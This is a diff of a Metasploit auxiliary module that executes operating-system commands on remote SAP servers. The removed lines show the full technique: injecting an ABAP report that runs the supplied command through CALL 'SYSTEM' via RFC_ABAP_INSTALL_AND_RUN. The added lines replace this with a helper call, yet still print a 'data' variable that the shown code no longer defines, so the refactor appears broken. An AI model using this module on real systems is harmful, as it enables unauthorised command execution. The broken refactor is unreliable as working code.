@@ -46,38 +46,9 @@ class Metasploit4 < Msf::Auxiliary
         fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
     end
     command = datastore['CMD']
-    exec_SYSTEM(user, client, pass, rhost, rport, command)
-  end
-
-  def exec_SYSTEM(user, client, pass, rhost, rport, command)
     login(rhost, rport, client, user, pass) do |conn|
-      conn.connection_info
-
-      function = conn.get_function("RFC_ABAP_INSTALL_AND_RUN")
-      fc = function.get_function_call
-
-      code = "REPORT EXTRACT LINE-SIZE 255 NO STANDARD PAGE HEADING." + "\r\n"
-      code << "TYPES lt_line(255) TYPE c." + "\r\n"
-      code << "DATA lv_cmd(42) TYPE c." + "\r\n"
-      code << "DATA lt_result TYPE STANDARD TABLE OF lt_line WITH HEADER LINE." + "\r\n"
-      code << "lv_cmd = '#{command}'." + "\r\n"
-      code << "CALL 'SYSTEM' ID 'COMMAND' FIELD lv_cmd" + "\r\n"
-      code << "ID 'TAB' FIELD lt_result-*sys*." + "\r\n"
-      code << "LOOP AT lt_result." + "\r\n"
-      code << "WRITE : / lt_result." + "\r\n"
-      code << "ENDLOOP." + "\r\n"
-
-      code.each_line do |line|
-        fc[:PROGRAM].new_row {|row| row[:LINE] = line.strip}
-      end
-
       begin
-        fc.invoke
-        data = ''
-        fc[:WRITES].each do |row|
-          data << row[:ZEILE] << "\n"
-        end
-
+        rfc_abap_install_and_run_cmd(conn, command)
         print_good("#{rhost}:#{rport} [SAP] Executed #{command}")
         print(data)
       rescue NWError => e
@@ -85,5 +56,6 @@ class Metasploit4 < Msf::Auxiliary
       end
     end
   end
+
 end
 
